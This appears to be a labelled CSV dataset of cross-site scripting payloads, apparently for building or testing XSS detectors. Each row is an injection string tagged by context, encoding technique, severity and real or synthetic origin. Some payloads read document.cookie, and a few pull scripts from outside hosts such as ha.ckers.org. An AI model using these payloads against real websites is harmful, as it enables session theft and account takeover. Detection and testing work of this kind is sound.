payload,context,technique,severity,length,source
"<div draggable=""true"" contenteditable>drag me</div><noscript ondrop=alert(1) contenteditable style=display:block>drop here</noscript>",event_handler,none,medium,133,real
<tfoot onpointerover=alert(1) style=display:block>AnonKryptiQuz</tfoot>,event_handler,none,medium,71,real
"&#101;v&#97;l(""&#97;l&#101;rt(docum&#101;nt.cooki&#101;)"")",dom_sink,synthetic,medium,58,synthetic
"<style>@keyframes x{}</style><summary style=""animation-name:x"" onanimationend=""alert(1)""></summary>",event_handler,none,medium,99,real
"<details onmouseenter=""alert(1)"">AnonKryptiQuz</details>",event_handler,none,medium,56,real
<input onfocus=write(XSS) autofocus>,event_handler,none,low,36,real
<abbr onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
"<style>:target {color:red;}</style><command id=x style=""transition:color 1s"" ontransitionend=alert(1)></command>",event_handler,none,medium,112,real
"<link onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</link>",event_handler,none,medium,81,real
"<hgroup onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</hgroup>",event_handler,none,medium,73,real
"<dir onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</dir>",event_handler,none,medium,79,real
"<keygen onmousemove=""alert(1)"">AnonKryptiQuz</keygen>",event_handler,none,medium,53,real
"<a href=""\x15javascript:javascript:alert(0205)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
"<form id=""test"" /><button form=""test"" formaction=""javascript:alert(123)"">TESTHTML5FORMACTION",js_uri,none,medium,92,real
<svg onload=&#97&#108&#101&#114&#116(1)>,event_handler,html_entity,low,40,real
"<pre draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</pre>",event_handler,none,medium,84,real
<details onpointerenter=alert(1) style=display:block>AnonKryptiQuz</details>,event_handler,none,medium,76,real
<em onpointermove=alert(1) style=display:block>AnonKryptiQuz</em>,event_handler,none,medium,65,real
"<style>:target {transform: rotate(180deg);}</style><rp id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></rp>",event_handler,none,medium,122,real
<input type=image onloadstart=alert(1) src=validimage.png>,event_handler,none,medium,58,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style=""position:absolute;"" onanimationcancel=""print()""></figcaption>",event_handler,none,low,189,real
""" oNclIck=coNsoLe.Log('XSS') """,attribute_escape,synthetic,medium,30,synthetic
<th onpointerleave=alert(1) style=display:block>AnonKryptiQuz</th>,event_handler,none,medium,66,real
""" oNbeGin=prOmpT(dOcuMenT.dOmaIn) """,attribute_escape,synthetic,medium,35,synthetic
"<form id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></form>",event_handler,none,medium,84,real
"<style>@keyframes slidein {}</style><marquee style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></marquee>",event_handler,none,medium,174,real
<details+/'on+/ontoggle=1^confirm(document.domain)+open//,event_handler,none,medium,57,real
&quot;&gt;&lt;img src=x onerror=prompt(&quot;AnonKryptiQuz&quot;)&gt;,event_handler,none,medium,69,real
"<section onmouseout=""alert(1)"">AnonKryptiQuz</section>",event_handler,none,medium,54,real
"<div draggable=""true"" contenteditable>drag me</div><output ondragover=alert(1) contenteditable style=display:block>drop here</output>",event_handler,none,medium,133,real
"<style>:target {transform: rotate(180deg);}</style><plaintext id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></plaintext>",event_handler,none,medium,136,real
<body contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,58,real
"<em onclick=""alert(1)"">AnonKryptiQuz</em>",event_handler,none,medium,41,real
"<noembed onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</noembed>",event_handler,none,medium,73,real
"<nav oncut=""alert(1)"" contenteditable>AnonKryptiQuz</nav>",event_handler,none,medium,57,real
"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script",script_injection,none,low,83,real
"<label oncut=""alert(1)"" contenteditable>AnonKryptiQuz</label>",event_handler,none,medium,61,real
<frame onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,67,real
<svg ontoggl&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,62,synthetic
"<svg onmouseenter=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,56,synthetic
"<colgroup onmouseenter=""alert(1)"">AnonKryptiQuz</colgroup>",event_handler,none,medium,58,real
"""%3E%3Csvg onmouseenter=prompt(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,medium,64,synthetic
"' oNclIck=alErt(StRinG.fRomChaRCoDe(88,83,83)) '",attribute_escape,synthetic,medium,48,synthetic
"<element onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</element>",event_handler,none,medium,70,real
<img/ src//'onerror/''/=confirm(1)//'>,tag_injection,none,medium,38,real
"<meta onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</meta>",event_handler,none,medium,65,real
"<param onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</param>",event_handler,none,medium,69,real
"alert(1)"" data-orig-proto=""javascript"" href=""javascript://",js_uri,none,medium,58,real
"<object onmouseover=""alert(1)"">AnonKryptiQuz</object>",event_handler,none,medium,53,real
"<abbr draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</abbr>",event_handler,none,medium,81,real
"<style>:target {color:red;}</style><legend id=x style=""transition:color 1s"" ontransitionstart=alert(1)></legend>",event_handler,none,medium,112,real
"<source draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</source>",event_handler,none,medium,70,real
j&#97;v&#97;script:prompt(docum&#101;nt.dom&#97;in),js_uri,synthetic,medium,51,synthetic
"<style>@keyframes x{}</style><article style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></article>",event_handler,none,medium,107,real
"<strike onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</strike>",event_handler,none,medium,65,real
"<fieldset onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</fieldset>",event_handler,none,medium,78,real
"<html onMouseEnter html onMouseEnter=""javascript:parent.javascript:alert(3087)""></html onMouseEnter>",event_handler,none,medium,100,real
/on<script>load=prompt(document.cookie);>,script_injection,none,high,41,real
"<div draggable=""true"" contenteditable>drag me</div><datalist ondragover=alert(1) contenteditable>drop here</datalist>",event_handler,none,medium,117,real
"""><svg onclick=\u0061lert(document.cookie)>",tag_injection,synthetic,medium,43,synthetic
"<link draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</link>",event_handler,none,medium,66,real
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,script_injection,unicode_escape,low,131,real
<isindex id=x tabindex=1 onbeforedeactivate=alert(1)></isindex><input autofocus>,event_handler,none,medium,80,real
<samp id=x tabindex=1 onbeforedeactivate=alert(1)></samp><input autofocus>,event_handler,none,medium,74,real
"<i onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</i>",event_handler,none,medium,75,real
<bdo id=x tabindex=1 onfocusin=alert(1)></bdo>,event_handler,none,medium,46,real
"<object classid=""clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"" onqt_error=""alert(126)"" style=""behavior:url(#x);""><param name=postdomevents /></object>//[""'`-->]]>]</div>",event_handler,none,medium,167,real
eval(%22confirm(1)%22),dom_sink,synthetic,medium,22,synthetic
"<pre onmousedown=""alert(1)"">AnonKryptiQuz</pre>",event_handler,none,medium,47,real
"<a2 id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></a2>",event_handler,none,medium,80,real
""" oNclIck=coNfiRm(DocUmeNt.CooKie) """,attribute_escape,synthetic,medium,36,synthetic
"<style>:target {color:red;}</style><input id=x style=""transition:color 1s"" ontransitionstart=alert(1)></input>",event_handler,none,medium,110,real
"<style>:target {color:red;}</style><body id=x style=""transition:color 1s"" ontransitionend=alert(1)></body>",event_handler,none,medium,106,real
<animatetransform onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,67,real
<script>javascript:alert(1)</script\x0D,script_injection,none,medium,39,real
<meter onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55,real
<dialog onpointermove=alert(1) style=display:block>AnonKryptiQuz</dialog>,event_handler,none,medium,73,real
"<spacer oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</spacer>",event_handler,none,medium,75,real
"""><img onload=alert(document.domain)>",tag_injection,synthetic,medium,37,synthetic
%3Csvg onmouseenter=alert(1)%3E,tag_injection,synthetic,medium,31,synthetic
"<style>@keyframes x{}</style><tt style=""animation-name:x"" onwebkitanimationend=""alert(1)""></tt>",event_handler,none,medium,95,real
<caption id=x tabindex=1 onfocusin=alert(1)></caption>,event_handler,none,medium,54,real
"<sub onmouseleave=""alert(1)"">AnonKryptiQuz</sub>",event_handler,none,medium,48,real
"<isindex onmousedown=""alert(1)"">AnonKryptiQuz</isindex>",event_handler,none,medium,55,real
"<frame onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</frame>",event_handler,none,medium,68,real
<strong onfocusout=alert(1) tabindex=1 id=x></strong><input autofocus>,event_handler,none,medium,70,real
<scr<object>ipt>alert(1)</script>,tag_injection,none,medium,33,real
"<style>:target {color: red;}</style><small id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></small>",event_handler,none,medium,113,real
"<datalist onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</datalist>",event_handler,none,medium,69,real
eval(%22alert(document.cookie)%22),dom_sink,synthetic,medium,34,synthetic
"<canvas draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</canvas>",event_handler,none,medium,85,real
<img src=x onerror=prompt(1)>//INJECTX,event_handler,none,medium,38,real
<img onload=\u0061lert(1)/>,tag_injection,synthetic,medium,27,synthetic
"""%3E%3Csvg onfocus=alert(document.cookie)%3E",tag_injection,synthetic,medium,44,synthetic
"<style>@keyframes x{}</style><code style=""animation-name:x"" onanimationstart=""alert(1)""></code>",event_handler,none,medium,95,real
"""&amp;lt;img src=1 onerror=alert(1)&amp;gt;",event_handler,none,medium,43,real
%27 onmouseover=console.log(location.hash) %27,attribute_escape,synthetic,medium,46,synthetic
"<td id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></td>",event_handler,none,medium,80,real
"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",script_injection,case_variation,low,58,real
"<noembed onmouseenter=""alert(1)"">AnonKryptiQuz</noembed>",event_handler,none,medium,56,real
"<tt oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</tt>",event_handler,none,medium,67,real
"<style>@keyframes x{}</style><font style=""animation-name:x"" onwebkitanimationend=""alert(1)""></font>",event_handler,none,medium,99,real
' oNtoGglE=cOnfIrm(doCumEnt.coOkiE) ',attribute_escape,synthetic,medium,37,synthetic
"?goto=javascript:alert(1)"",",js_uri,none,medium,27,real
"""%3E%3Csvg onload=prompt(1)%3E",tag_injection,synthetic,medium,30,synthetic
<figcaption onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,60,real
"<dl onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</dl>",event_handler,none,medium,79,real
"<style>@keyframes x{}</style><frameset style=""animation-name:x"" onwebkitanimationend=""alert(1)""></frameset>",event_handler,none,medium,107,real
<svG oNtoGglE=pRomPt(DocUmeNt.CooKie)/>,tag_injection,synthetic,medium,39,synthetic
<param onpointerover=alert(1) style=display:block>AnonKryptiQuz</param>,event_handler,none,medium,71,real
"<a href=""javascript:alert(1)"">a</a>",js_uri,none,medium,35,real
"<style>@keyframes x{}</style><b style=""animation-name:x"" onwebkitanimationend=""alert(1)""></b>",event_handler,none,medium,93,real
"<blockquote onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</blockquote>",event_handler,none,medium,80,real
"' onload=\u0061lert(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,medium,52,synthetic
""" onclick=alert(document.cookie) """,attribute_escape,synthetic,medium,34,synthetic
"<wbr ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</wbr>",event_handler,none,medium,87,real
%22><svg onclick=alert(document.domain)>,tag_injection,synthetic,medium,40,synthetic
"""><input type=""hidden"" oncontentvisibilityautostatechange=""confirm(/Bypassed/)"" style=""content-visibility:auto"">",event_handler,none,medium,112,real
"<del draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</del>",event_handler,none,medium,84,real
"<input4 onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</input4>",event_handler,none,medium,71,real
<small onpointerdown=alert(1) style=display:block>AnonKryptiQuz</small>,event_handler,none,medium,71,real
"<menuitem onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</menuitem>",event_handler,none,medium,77,real
"<table><TD BACKGROUND=""javascript:document.vulnerable=true;"">",js_uri,none,low,61,real
<center onpointerleave=alert(1) style=display:block>AnonKryptiQuz</center>,event_handler,none,medium,74,real
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E,event_handler,url_encoding,low,116,real
"<style>@keyframes x{}</style><spacer style=""animation-name:x"" onanimationstart=""alert(1)""></spacer>",event_handler,none,medium,99,real
<SCRIPT SRC=//ha.ckers.org/.j>,script_injection,case_variation,low,30,real
"<dialog onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</dialog>",event_handler,none,medium,71,real
"<div draggable=""true"" contenteditable>drag me</div><table ondragover=alert(1) contenteditable style=display:block>drop here</table>",event_handler,none,medium,131,real
""" onclick=confirm(document.domain) """,attribute_escape,synthetic,medium,36,synthetic
"<nav onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</nav>",event_handler,none,medium,67,real
"<embed onmousemove=""alert(1)"">AnonKryptiQuz</embed>",event_handler,none,medium,51,real
<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>,script_injection,none,low,59,real
"<output onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</output>",event_handler,none,medium,65,real
"?getURL,javascript:alert(1)"",",js_uri,none,medium,29,real
"<script onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></script>",script_injection,none,medium,285,real
' onfocus=confirm('XSS') ',attribute_escape,synthetic,medium,26,synthetic
""" onfocus=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape,synthetic,medium,59,synthetic
<summary id=x tabindex=1 onfocusin=alert(1)></summary>,event_handler,none,medium,54,real
"<scRipT>cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))</ScrIpt>",script_injection,synthetic,medium,55,synthetic
<svg><script>alert('33'),script_injection,none,medium,24,real
"<style>:target {color:red;}</style><xmp id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></xmp>",event_handler,none,medium,110,real
'() {'document.createElement('img').src='javascript:while(1){}',js_uri,none,high,63,real
"<form><button formaction=""javascript:alert(1)"">",js_uri,none,medium,47,real
"<audio onmouseout=""alert(1)"">AnonKryptiQuz</audio>",event_handler,none,medium,50,real
"<mark draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</mark>",event_handler,none,medium,86,real
<iframe onpointerdown=alert(1) style=display:block>AnonKryptiQuz</iframe>,event_handler,none,medium,73,real
"<progress onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</progress>",event_handler,none,medium,75,real
"<svg onload=""void 'javascript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e';""></svg>",event_handler,html_entity|comment_injection|url_encoding,medium,204,real
